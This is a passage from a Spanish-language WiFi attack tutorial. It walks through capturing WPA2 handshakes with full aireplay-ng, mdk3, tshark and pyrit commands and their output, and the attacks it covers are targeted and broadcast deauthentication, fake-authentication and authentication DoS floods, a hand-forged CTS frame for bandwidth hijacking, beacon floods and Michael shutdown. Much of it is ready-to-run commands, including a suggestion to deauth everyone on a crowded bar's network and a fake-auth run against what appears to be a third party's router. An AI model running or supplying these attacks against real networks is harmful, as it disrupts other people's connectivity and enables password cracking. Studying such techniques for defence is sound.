┌─[✗]─[root@parrot]─[/home/s4vitar]
└──╼ #aireplay-ng -0 10 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon
20:48:28  Waiting for beacon frame (BSSID: 20:34:FB:B1:C5:53) on channel 1
20:48:29  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [18|65 ACKs]
20:48:29  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [11|63 ACKs]
20:48:30  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:30  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [14|66 ACKs]
20:48:31  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [17|63 ACKs]
20:48:32  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:32  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [24|66 ACKs]
20:48:33  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:33  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:34  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
```

Ahora bien, para saber si nuestros paquetes están surtiendo efecto sobre la estación, el truco está en
contemplar el valor izquierdo que figura en los valores situados a la derecha del todo '**[18|65 ACks]**'.
Siempre que este sea mayor que 0, ello querrá decir que nuestros paquetes están siendo enviados correctamente
a la estación.

Si haces estas practicas en local, podrás comprobar cómo tu dispositivo en caso de haber sido la estación
víctima, habría sido desconectado del AP. Por otro lado, aunque lo veremos más adelante, imaginemos que ahora
paramos el ataque, ¿qué creéis que pasaría?. Fijaros que en la mayoría de las veces, los dispositivos tienden
a recordar los puntos de acceso a los que alguna vez han estado conectados. 

Esto es así debido a los paquetes **Probe Request**:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -i wlan0mon -Y 'wlan.fc.type_subtype==4' 2>/dev/null
   49 1.516614496 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=98, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  242 9.119006178 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=112, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  473 17.062963738 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=126, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  487 17.411192451 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=128, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  511 18.533411763 IntelCor_46:d1:38 → Broadcast    802.11 285 Probe Request, SN=2477, FN=0, Flags=........C, SSID=hacklab
  512 18.552100778 IntelCor_46:d1:38 → Broadcast    802.11 285 Probe Request, SN=2479, FN=0, Flags=........C, SSID=hacklab
  513 18.556049394 IntelCor_46:d1:38 → Broadcast    802.11 278 Probe Request, SN=2480, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  515 18.649006729 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, SN=1719, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  516 18.650498757 Google_71:cf:8c → Broadcast    802.11 208 Probe Request, SN=1720, FN=0, Flags=........C, SSID=MOVISTAR_DF12
  517 18.669117644 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, SN=1721, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  518 18.670480133 Google_71:cf:8c → Broadcast    802.11 208 Probe Request, SN=1722, FN=0, Flags=........C, SSID=MOVISTAR_DF12
  519 18.691337428 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, SN=1723, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
```

Y es justamente aquí donde está la gracia, pues de parar el ataque, el dispositivo lo que de manera automática
hará será reconectarse al AP, sin nosotros tener que hacer nada. Y es en este momento, donde se generará el Handshake:

```bash
 CH  1 ][ Elapsed: 6 mins ][ 2019-08-08 20:54 ][ WPA handshake: 20:34:FB:B1:C5:53                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -28 100     3564      684    2   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 (not associated)   24:A2:E1:48:66:14  -87    0 - 1      0        5                                                                                                                     
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -19    0e- 6e     0     2538  hacklab
 ```

 Si nos fijamos, en la parte superior, la propia suite nos indica **WPA handshake** seguido de la dirección
 MAC del AP, debido a que se ha capturado el Handshake correspondiente al cliente que hemos deautenticado y
 que se acaba de reasociar.

 Jugaremos con el Handshake más adelante, veamos primero otras formas de obtener el Handshake.

 #### Ataque de deautenticación global

 Imaginemos ahora que estamos en un bar, un bar lleno de gente con un punto de acceso del propio
 establecimiento. En estos casos, cuando una red dispone de tantos clientes asociados, es más factible lanzar
 otro tipo de ataque, el **ataque de deautenticación global**.

 A diferencia del ataque de deautenticación dirigido, en el ataque de deautenticación global, se hace uso de
 una **Broadcast MAC Address** como dirección MAC de estación objetivo a utilizar. Lo que conseguimos con esta
 dirección MAC, es expulsar a todos los clientes que se encuentren asociados el AP.

 Esto es mejor incluso, dado que siempre es probable que en una muestra de 20 clientes, 5 de ellos a lo mejor
 no se encuentren lo suficientemente cerca del router para elaborar el ataque (recordemos que esto se puede
 ver tanto desde el **PWR** como a nivel de **Frames** emitidos por la estación). En vez de estar por tanto
 deautenticando de cliente en cliente hasta dar con aquel que se encuentre a una distancia considerable como
 para que capturemos un Handshake, resulta más cómodo expulsarlos a todos.

 Basta con que uno de todos esos clientes se reconecte, para capturar un Handshake válido. Hay que tener en
 cuenta que es posible capturar múltiples Handshakes por parte de distintas estaciones en un mismo AP, pero
 esto no supone ningún problema.

 El ataque se puede elaborar de 2 formas, una es la siguiente:

 * aireplay-ng -0 0 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon

Obteniendo los siguientes resultados:

 ```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #aireplay-ng -0 10 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon
21:10:33  Waiting for beacon frame (ESSID: hacklab) on channel 12
Found BSSID "20:34:FB:B1:C5:53" to given ESSID "hacklab".
21:10:33  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:34  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:34  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:35  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:37  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1| 0 ACKs]
21:10:37  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:38  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 2| 0 ACKs]
 ```

Y la otra sin especificar ninguna dirección MAC, lo que por defecto la suite interpretará como un ataque de
deautenticación global:

* aireplay-ng -0 0 -e hacklab wlan0mon

Obteniendo estos resultados:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #aireplay-ng -0 10 -e hacklab wlan0mon
21:11:46  Waiting for beacon frame (ESSID: hacklab) on channel 12
Found BSSID "20:34:FB:B1:C5:53" to given ESSID "hacklab".
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
21:11:46  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:51  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
```

#### Ataque de autenticación

Puede sonar raro, pero también existe un ataque llamado ataque de autenticación o asociación. A través de este
ataque, en vez de expulsar a clientes de una red, lo que hacemos es añadirlos.

Te preguntarás, ¿y qué consigo con eso?, buena pregunta. Nuestro objetivo como atacantes es hacer siempre que
de una u otra forma, los clientes de una red sean reasociados para capturar un Handshake. 

¿Qué crees que pasaría si en una red inyectamos 5.000 clientes?, exacto, por ahí van los tiros. Si una red
dispone de tantos clientes asociados, el router se vuelve loco... incluso hasta notaríamos de hacerlo en local
que la red comenzaría a ir lenta, llegando al punto en el que seríamos expulsados de esta hasta detener el
ataque.

Inyectar a un cliente es bastante sencillo, lo hacemos a través del parámetro '**-1**' de aireplay:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #echo; aireplay-ng --help | tail -n 13 | grep "\-1" | sed '/^\s*$/d' | sed 's/^ *//'; echo

--fakeauth    delay : fake authentication with AP (-1)
```

Imaginemos que tenemos este escenario:

```bash
 CH  6 ][ Elapsed: 30 s ][ 2019-08-08 21:20                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 1C:B0:44:D4:16:78  -52  12      232        6    0   6  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                            
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 (not associated)   AC:D1:B8:17:91:C0  -69    0 - 1      0        5                                                                                                                     
 (not associated)   E0:B9:BA:AE:90:FB  -88    0 - 1      0        1                                
```

Veamos cómo podríamos por ejemplo llevar a cabo una falsa autenticación haciendo uso de nuestra tarjeta de red
como estación:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #aireplay-ng -1 0 -e MOVISTAR_1677 -h 00:a0:8b:cd:02:65 wlan0mon
21:20:28  Waiting for beacon frame (ESSID: MOVISTAR_1677) on channel 6
Found BSSID "1C:B0:44:D4:16:78" to given ESSID "MOVISTAR_1677".

21:20:28  Sending Authentication Request (Open System) [ACK]
21:20:28  Authentication successful
21:20:28  Sending Association Request

21:20:33  Sending Authentication Request (Open System) [ACK]
21:20:33  Authentication successful
21:20:33  Sending Association Request

21:20:38  Sending Authentication Request (Open System) [ACK]
21:20:38  Authentication successful
21:20:38  Sending Association Request [ACK]
21:20:38  Association successful :-) (AID: 1)
```

Con el parámetro '**-h**', especificamos la dirección MAC del falso cliente a autenticar. Si volvemos a
analizar ahora la red inalámbrica, podremos ver que nuestra tarjeta de red figura como cliente:

```bash
 CH  6 ][ Elapsed: 30 s ][ 2019-08-08 21:20                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 1C:B0:44:D4:16:78  -52  12      232        6    0   6  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                            
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 (not associated)   AC:D1:B8:17:91:C0  -69    0 - 1      0        5                                                                                                                     
 (not associated)   E0:B9:BA:AE:90:FB  -88    0 - 1      0        1                                                                                                                     
 1C:B0:44:D4:16:78  00:A0:8B:CD:02:65    0    0 - 1      0        7                         
```

Cabe decir que esto no hace que nos conectemos a la red directamente y ya tengamos internet, sino menuda
gracia, estaríamos bypasseando la seguridad del pleno 802.11. Lo que estamos haciendo es engañar al router,
haciéndole creer que dispone de ese cliente asociado.

A efectos prácticos, por el momento esto no genera ningún inconveniente, ¿cómo autenticamos por tanto ahora a
5.000 clientes?. Podríamos montarnos un simple script que lo hiciera por nosotros generando direcciones MAC
aleatorias, pero ya contamos con una herramienta que nos hace todo el trabajo, **mdk3**.

A través de la utilidad **mdk3**, tenemos un modo de ataque '**Authentication DoS Mode**' que se encarga de
asociar a miles de clientes al AP objetivo. Esto se hace haciendo uso de la siguiente sintaxis:

* mdk3 wlan0mon a -a bssidAP

Veámoslo en la práctica, aplicamos el comando por un lado:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar]
└──╼ #mdk3 wlan0mon a -a 20:34:FB:B1:C5:53 # Dirección MAC del AP hacklab
```

Si analizamos la consola donde estamos monitorizando el AP, podremos notar lo siguiente:

```bash
 CH 12 ][ Elapsed: 1 min ][ 2019-08-08 21:27                                         
                                                                                         
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                         
 20:34:FB:B1:C5:53  -27 100      819      177    2  12  180  WPA2 CCMP   PSK  hacklab    
                                                                                         
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe               
                                                                                         
 (not associated)   AC:D1:B8:17:91:C0  -73    0 - 1     12       25                       
 20:34:FB:B1:C5:53  22:19:BA:9B:7D:F5    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  48:47:15:5C:BB:6F    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AF:3B:33:CD:E3:50    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -30    1e- 6e     0      223                       
 20:34:FB:B1:C5:53  3E:A1:41:E1:FC:67    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  21:3D:DC:87:70:E9    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  54:11:0E:82:74:41    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AB:B2:CD:C6:9B:B4    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  05:17:58:E9:5E:D4    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  31:58:A3:5A:25:5D    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  C9:9A:66:32:0D:B7    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  76:5A:2E:63:33:9F    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  54:F8:1B:E8:E7:8D    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  F2:FB:E3:46:7C:C2    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  4A:EC:29:CD:BA:AB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  67:C6:69:73:51:FF    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  3E:01:7E:97:EA:DC    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  6B:96:8F:38:5C:2A    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  EC:B0:3B:FB:32:AF    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  3C:54:EC:18:DB:5C    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  02:1A:FE:43:FB:FA    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AA:3A:FB:29:D1:E6    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  05:3C:7C:94:75:D8    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  BE:61:89:F9:5C:BB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  A8:99:0F:95:B1:EB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  F1:B3:05:EF:F7:00    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  E9:A1:3A:E5:CA:0B    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  CB:D0:48:47:64:BD    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  1F:23:1E:A8:1C:7B    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  64:C5:14:73:5A:C5    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  5E:4B:79:63:3B:70    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  64:24:11:9E:09:DC    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AA:D4:AC:F2:1B:10    0    0 - 1      0        1      
```

Exacto, una locura de clientes asociados que ni llego a seleccionar de lo largo que es la lista. De manera
casi inmediata, la red comienza a ir lenta y se queda temporalmente inoperativa, llegando a expulsar incluso a
los clientes más lejanos o con poca señal WiFi.

#### CTS Frame Attack

Un ataque bastante interesante, que incluso puede llegar a dejar inoperativa una red inalámbrica durante un
largo período de tiempo, aunque paremos el ataque.

Lo que haremos será abrir **Wireshark** por un lado, capturando paquetes de tipo **CTS** (Clear-To-Send):

<img align="center" src="https://funkyimg.com/i/2W6gT.png">

Recomiendo investigar sobre este tipo de paquetes junto al **RTS**, tienen una historia muy bonita frente al
problema del **nodo oculto**, evitando las famosas colisiones de trama.

Un paquete **CTS** dispone generalmente de 4 campos:

* Frame Control
* Duración
* RA (Dirección del Receptor)
* FCS

El campo del tiempo para dicho paquete puede ser visto rápidamente desde Wireshark (**304 microsegundos**):

<img align="center" src="https://funkyimg.com/i/2W6h5.png">

Lo que haremos una vez dispongamos de un paquete **CTS**, será exportar dicho paquete en un formato
'**Wireshark/tcpdump/... -pcap**':

<img align="center" src="https://funkyimg.com/i/2W6hf.png">

Si analizamos la captura, veremos que los datos contemplados siguen siendo los mismos:

<img align="center" src="https://funkyimg.com/i/2W6hp.png">

Una vez llegados a este punto, en mi caso haré uso de la herramienta '**ghex**' para abrir la captura con un
editor hexadecimal:

<img align="center" src="https://funkyimg.com/i/2W6hu.png">

En esta parte es importante hacer la siguiente distinción:

* Los últimos 4 valores: 11 D1 13 85 corresponden al FCS, deberán ser computados por cada variación que
  hagamos sobre el resto de valores. Sin embargo, no nos preocupemos por ello... ya que nos lo dará el propio
  Wireshark :)

* Los 6 valores anteriores al FCS: **30 45 96 BF 9D 2C**, corresponden a la dirección MAC del router. Obviamente, este valor deberá de ser cambiado al deseado.

* Los 2 valores anteriores al FCS: **30 01**, corresponden al tiempo en microsegundos puesto en hexadecimal y
  **Little Endian**.

Para el último punto, por si han habido confusiones:

<img align="center" src="https://funkyimg.com/i/2W6hA.png">

Ahí vemos que corresponden a los 304 microsegundos. Ahora bien, aquí es donde viene el vector de ataque, vamos
a ver cuál sería el valor en hexadecimal del valor tope permitido (**30.000 microsegundos**):

<img align="center" src="https://funkyimg.com/i/2W6hE.png">

Tratemos desde **ghex** de sustituir el valor de los 304 microsegundos a 30.000 microsegundos, poniendo su
representación en hexadecimal y Little Endian:

<img align="center" src="https://funkyimg.com/i/2W6hP.png">

**CONSIDERACIÓN**: También he especificado la dirección MAC del AP objetivo en **ghex** (**64:D1:54:88:BA:3C**)

Podríamos pensar que es así de simple, pero no. Recordemos que para cada cambio realizado, hay que computar el
valor del **FCS**, pues de lo contrario el paquete es inválido. Uno puede optar por comerse la cabeza y tratar
de hacerlo manualmente, pero otra forma es guardando y abriendo esa propia captura desde **Wireshark**:

<img align="center" src="https://funkyimg.com/i/2W6ia.png">

Como vemos, es una maravilla, dado que ya el propio **Wireshark** nos da el valor del **FCS** que necesitamos
para la captura manipulada. 

Por tanto, le hacemos caso y lo cambiamos (Recordemos el Little Endian, también se aplica para este caso):

<img align="center" src="https://funkyimg.com/i/2W6in.png">

Una vez llegados a este punto, guardamos la captura y probamos a abrirla nuevamente desde Wireshark:

<img align="center" src="https://funkyimg.com/i/2W6iy.png">

Esto son buenas noticias, pues no nos sale ningún tipo de error, ¡hemos construido un paquete válido!.

Ahora es cuando viene la parte divertida, inyectemos dicho paquete a nivel de red:

<img align="center" src="https://funkyimg.com/i/2W6iJ.png">

Como vemos, se han tramitado un total de 10.000 paquetes de tipo **CTS** con un tiempo total de 30.000
microsegundos para cada uno. Encima le hemos añadido el parámetro '**--topspeed**' para evitar que el
siguiente paquete se envié una vez el anterior se ha terminado de enviar, haciendo que todos queden en cola.

Por aquí podemos ver los valores de cada uno de estos paquetes enviados:

<img align="center" src="https://funkyimg.com/i/2W6iP.png">

¿Resultado?, lo que se conoce como un secuestro del ancho de banda, haciendo que la red quede completamente
inoperativa durante un largo período de tiempo. No recomiendo hacer el ataque en nuestra propia red.

#### Beacon Flood Mode Attack

Un **beacon** es un paquete que contiene información sobre el punto de acceso, como por ejemplo, en qué canal
se encuentra, qué tipo de cifrado lleva, cómo se llama la red, etc.

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==0x8" 2>/dev/null
    1 0.000000000 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1585, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
    2 0.307210202 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1588, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
    3 0.614413670 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1591, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
    4 0.921614210 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1594, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
```

La peculiaridad de los beacons es que estos se transmiten en claro, ya que las tarjetas de red y otros
dispositivos necesitan poder recoger este tipo de paquetes y extraer la información necesaria para conectarse.

A través de la herramienta **mdk3**, podemos generar un ataque conocido como **Beacon Flood Attack**,
generando montón de paquetes Beacon con información falsa. ¿Qué conseguimos con esto?, pues bueno, uno de los
ataques clásicos consistiría en generar montones de puntos de acceso situados en el mismo canal que un punto
de acceso objetivo, logrando así dañar el espectro de onda de la red dejándola no operativa e invisible por los
usuarios.

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #for i in $(seq 1 10); do echo "MyNetwork$i" >> redes.txt; done
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #cat redes.txt 
MyNetwork1
MyNetwork2
MyNetwork3
MyNetwork4
MyNetwork5
MyNetwork6
MyNetwork7
MyNetwork8
MyNetwork9
MyNetwork10
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #mdk3 wlan0mon b -f redes.txt -a -s 1000 -c 7
```

En este caso, estaríamos generando un buen puñado de puntos de acceso con los **ESSID** listados en el
archivo, todos ellos posicionados en el canal 7. Para los curiosos, el parámetro '**-a**' lo que se encarga es
de anunciar redes WPA2, y el parámetro '**-s**' establece la velocidad de los paquetes emitidos por segundo,
que por defecto están establecidos a 50.

Por si queréis ver cómo se vería todo desde un dispositivo tercero que trata de escanear o listar los puntos
de acceso disponibles en el entorno:

<img align="center" src="https://funkyimg.com/i/2W6s8.jpg">

De hecho, hasta si queréis causar curiosidad en el ambiente, si corréis este modo de ataque con **mdk3** sin
especificar parámetros:

* mdk3 wlan0mon b

Estaríamos generando puntos de acceso con **ESSID's** aleatorios:

<img align="center" src="https://funkyimg.com/i/2W6sd.png">

#### Disassociation Amok Mode Attack

Realmente esto no deja de parecerse a un ataque de de-autenticación dirigido, pero por cultura, **mdk3**
cuenta con unos modos de operación de tipo **Black List/White List**, desde los cuales podemos especificar qué
clientes queremos que no sean deautenticados del AP, añadiendo a los mismos en un White List y viceversa.

Para construir el ataque, simplemente debemos crear un fichero con las direcciones MAC de los clientes a los
cuales queremos de-autenticar del AP. Posteriormente, corremos **mdk3** especificando el modo de ataque y el
canal en el que se encuentra la red:

<img align="center" src="https://funkyimg.com/i/2W6tU.png">

#### Michael Shutdown Exploitation

Tal y como dice la propia descripción de la utilidad:

`"Can shut down APs using TKIP encryption and QoS Extension with 1 sniffed and 2 injected QoS Data Packets"`

Es decir, podemos llegar a apagar un router a través de este ataque. 

**ANOTACIÓN:** En la práctica, no es muy efectivo.

La sintaxis sería la siguiente:

* mdk3 wlan0mon m -t bssidAP

#### Técnicas Pasivas

Todo lo visto hasta el momento, requiere de la intervención por nuestra parte en el lado del atacante. 

Tendríamos un modo de actuar de forma pasiva para obtener el Handshake, y es simplemente armarnos de valor y
tener paciencia. 

Podríamos quedarnos esperando hasta que algunas de las estaciones asociadas disponga de mala
señal, se desconecte y reasocie automáticamente sin nosotros tener que hacer nada. Podríamos quedarnos
esperando hasta que de pronto alguien nuevo que ya estaba asociado en el pasado a la red se asocie de nuevo al
AP. Se podría hacer de montón de maneras distintas.

Lo importante de todo esto es, que el Handshake, no tiene por qué generarse en base a la reautenticación del
cliente a la red pero sólo si nosotros lo hemos expulsado de la red. Me refiero, el Handshake no guarda
relación alguna con el ataque de de-autenticación para forzar al cliente a que se reconecte a la red.

Siempre el Handshake se va a generar en el momento en el que el cliente se vuelva a conectar a la red, sea por
nuestros medios activos o sin hacer nada a voluntad de la calidad de la señal entre la estación y el AP, o por
el propio cliente que se ha vuelto a reconectar por 'X' razones.

### Validación del Handshake con Pyrit

Hasta ahora hemos visto técnicas para capturar un Handshake. Ahora bien, en ocasiones, puede suceder que la
suite de aircrack-ng nos diga que ha capturado un Handshake cuando realmente no es así, no sería la primera
vez que me ha llegado a suceder.

¿Qué mejor que validar la captura con otra herramienta?, con **pyrit**. Pyrit es una herramienta bestial para
el cracking, análisis de capturas y monitorizado de redes inalámbricas. Uno de los modos de los que dispone,
es de una especie de '**checker**', con el cual podemos analizar la captura para ver si esta cuenta con un
**Handshake** o no.

Por ejemplo, imaginemos que hemos capturado un supuesto Handshake de una red inalámbrica, o al menos eso vemos
desde **aircrack-ng**. Si quisiéramos ahora validarlo desde **Pyrit**, haríamos lo siguiente sobre la captura
'.cap':

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pyrit -r Captura-01.cap analyze
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'Captura-01.cap' (1/1)...
Parsed 2 packets (2 802.11-packets), got 1 AP(s)

#1: AccessPoint 1c:b0:44:d4:16:78 ('MOVISTAR_1677'):
No valid EAOPL-handshake + ESSID detected.
```

Como vemos, '**No valid EAOPL-handshake + ESSID detected.**', por lo que la captura no cuenta con ningún
Handshake.

Veamos ahora un caso donde sí nos reporta que la captura cuenta con un Handshake válido:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pyrit -r Captura-02.cap analyze
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'Captura-02.cap' (1/1)...
Parsed 63 packets (63 802.11-packets), got 1 AP(s)

#1: AccessPoint 20:34:fb:b1:c5:53 ('hacklab'):
  #1: Station 34:41:5d:46:d1:38, 1 handshake(s):
    #1: HMAC_SHA1_AES, good*, spread 1
```

Tal y como se puede observar, la red **hacklab** cuenta con un Handshake generado por parte de la estación
**34:41:5d:46:d1:38**, lo cual incluso nos viene de maravilla, porque así tenemos una traza de todo lo
referente a dicha captura, incluido el nombre de la red inalámbrica en caso de que el nombre de nuestra
captura no identifique al AP.

### Tratamiento y filtro de la captura

Cabe decir que a la hora de capturar un Handshake, capturamos tal vez más de lo que necesitamos durante el
tiempo de espera. La captura final, puede ser tratada para extraer simplemente la información más relevante
del AP, que sería el **eapol**.

Con la herramienta **tshark**, podemos generar una nueva captura filtrando únicamente los paquetes que nos
interesa de la captura previamente realizada:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-02.cap -Y "eapol" 2>/dev/null
   34   7.903744 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)
   36   7.907316 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)
   40   7.912448 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)
   42   7.914483 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-02.cap -Y "eapol" 2>/dev/null -w filteredCapture
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pyrit -r filteredCapture analyze
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'filteredCapture' (1/1)...
Parsed 4 packets (4 802.11-packets), got 1 AP(s)

#1: AccessPoint 20:34:fb:b1:c5:53 ('None'):
  #1: Station 34:41:5d:46:d1:38, 1 handshake(s):
    #1: HMAC_SHA1_AES, good, spread 1
No valid EAOPL-handshake + ESSID detected.
```

Y como vemos, nos sigue notificando de que hay 1 Handshake válido por parte de la estación especificada. Sin
